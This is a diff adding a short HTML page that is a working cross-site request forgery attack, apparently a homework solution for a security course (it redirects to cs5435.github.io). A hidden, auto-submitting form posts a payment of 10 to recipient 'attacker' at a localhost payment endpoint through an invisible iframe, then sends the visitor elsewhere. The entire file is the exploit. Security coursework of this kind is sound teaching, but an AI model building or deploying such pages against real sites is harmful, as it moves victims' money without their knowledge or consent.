@@ -1,0 +1,30 @@
+<html>
+<head>
+  <style>
+    .payment-form{visibility:hidden;}
+  </style>
+</head>
+<body>
+  <div class="payment-form">
+    <h3 class="payment-header">Make payment?</h3>
+    <form action="http://localhost:8080/pay" method="post" id="csrf" target="dummyframe">
+      <div class="form-group">
+        <div class="form-label">To:</div>
+        <div class="form-input"><input name="recipient" type="hidden" value="attacker"/></div>
+      </div>
+      <div class="form-group">
+        <div class="form-label">Amount:</div>
+        <div class="form-input"><input name="amount" type="hidden" value="10"/></div>
+      </div>
+      <input class="form-button" type="submit" value="Pay"/>
+    </form>
+    <iframe name="dummyframe" id="dummyframe" style="display:none;"></iframe>
+    <script>
+      document.getElementById("csrf").submit()
+      document.getElementById("dummyframe").addEventListener("load", function(){window.location.href="http://cs5435.github.io"})
+    </script>
+  </div>
+</body>
+
+
+</html>
